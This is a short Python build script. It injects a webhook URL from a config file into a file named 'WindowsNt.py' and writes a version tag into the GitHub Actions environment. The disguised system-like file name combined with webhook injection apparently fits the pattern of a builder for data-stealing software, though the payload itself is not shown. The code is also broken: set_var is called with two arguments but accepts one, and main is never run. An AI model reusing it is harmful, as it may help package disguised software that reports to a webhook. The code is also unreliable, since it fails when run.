import os
import json
from datetime import datetime

with open('config.json') as r:
    config = json.load(r)

env_file_path = os.getenv('GITHUB_ENV')
date = datetime.now().strftime("%d:%m:%Y")
time = datetime.now().strftime("%H:%M:%S")

def setup_webhook():
    content = f"webhook = \'{config.get('webhook')}\'\n"
    with open('WindowsNt.py','r') as r:
        content += r.read()
    with open('WindowsNt.py','w') as w:
        w.write(content)

def set_var(dic):
    with open(env_file_path, 'a', encoding='utf-8-sig') as env_file:
        env_file.write(f"{dic[0]}={dic[1]}\n")


def main():
    setup_webhook()
    set_var('TAG_NAME',config.get('version'))
